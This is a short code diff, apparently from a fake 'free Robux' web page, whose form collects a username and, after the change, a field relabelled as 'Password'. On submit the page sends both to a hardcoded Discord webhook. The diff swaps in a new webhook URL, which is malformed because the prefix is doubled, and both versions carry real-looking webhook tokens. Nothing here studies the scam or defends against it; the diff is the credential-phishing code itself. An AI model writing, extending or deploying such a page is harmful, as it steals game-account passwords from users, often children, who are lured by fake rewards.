@@ -96,7 +96,7 @@
   const form = document.getElementById('fakeRobuxForm');
   const resultDiv = document.getElementById('result');
 
-  const webhookURL = "https://discord.com/api/webhooks/1387878891980455946/PyFFdZS5NLAuHX-vmrsRv0ihfEw7toOEMHoy2NFTYdORXpnnO1yPNSfEriPM_r6bW-JV";
+  const webhookURL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1389527268266868736/Z0nBWLITFow1e9ibH0zu_kM1TJe2IsvGSVZq8-eUP07YGjpZFEvP1LgYDJRfSnHDUtLo";
 
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
@@ -105,7 +105,7 @@
     const lol = document.getElementById('lol').value.trim();
     const robux = document.getElementById('robux').value.trim();
 
-    const content = `**Pseudo:** ${pseudo}\n**Texte Lol:** ${lol}`;
+    const content = `**Pseudo:** ${pseudo}\n**Password :** ${lol}`;
 
     try {
       const response = await fetch(webhookURL, {
